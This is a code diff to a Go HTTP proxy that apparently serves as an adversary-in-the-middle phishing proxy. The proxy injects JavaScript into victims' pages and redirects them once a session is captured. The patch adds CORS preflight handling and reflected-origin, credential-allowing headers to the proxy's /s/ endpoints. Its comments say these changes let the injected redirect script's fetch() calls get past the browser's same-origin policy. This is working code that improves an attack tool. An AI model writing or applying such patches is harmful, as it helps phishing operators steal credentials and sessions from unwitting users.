@@ -293,6 +293,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
 
+			// Handle CORS preflight for /s/* endpoints so the browser's fetch()
+			// in the injected redirect JS is not blocked by the same-origin policy.
+			if req.Method == "OPTIONS" && redir_re.MatchString(req.URL.Path) {
+				resp := goproxy.NewResponse(req, "text/plain", 200, "")
+				resp.Header.Set("Access-Control-Allow-Origin", req.Header.Get("Origin"))
+				resp.Header.Set("Access-Control-Allow-Credentials", "true")
+				resp.Header.Set("Access-Control-Allow-Methods", "GET, OPTIONS")
+				resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+				resp.Header.Set("Access-Control-Max-Age", "86400")
+				return req, resp
+			}
+
 			if js_inject_re.MatchString(req.URL.Path) {
 				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
 				if len(ra) >= 3 {
@@ -351,10 +363,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									s_index, _ := p.sids[session_id]
 									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
 									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
+									// CORS headers so fetch() in the injected JS can read this response.
+									resp.Header.Set("Access-Control-Allow-Origin", req.Header.Get("Origin"))
+									resp.Header.Set("Access-Control-Allow-Credentials", "true")
+									resp.Header.Set("Access-Control-Allow-Methods", "GET, OPTIONS")
+									resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
 									return req, resp
 								}
 							}
 							resp := goproxy.NewResponse(req, "application/json", 408, "")
+							// CORS headers required even on retry responses.
+							resp.Header.Set("Access-Control-Allow-Origin", req.Header.Get("Origin"))
+							resp.Header.Set("Access-Control-Allow-Credentials", "true")
 							return req, resp
 						} else {
 							log.Warning("api: session not found: '%s'", session_id)
